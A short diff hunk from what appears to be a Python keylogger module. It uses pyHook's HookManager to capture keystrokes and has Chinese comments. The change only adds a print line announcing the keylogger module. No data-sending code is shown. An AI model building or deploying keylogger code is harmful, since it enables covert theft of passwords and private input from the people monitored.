@@ -68,6 +68,7 @@ def keyStore(event):
     # 返回直到下一个钩子事件被触发
     return True
 def run(**args):
+	print "[*] In keylogger module."
 # 创建和注册钩子函数管理器
 	k1 =pyHook.HookManager()
 
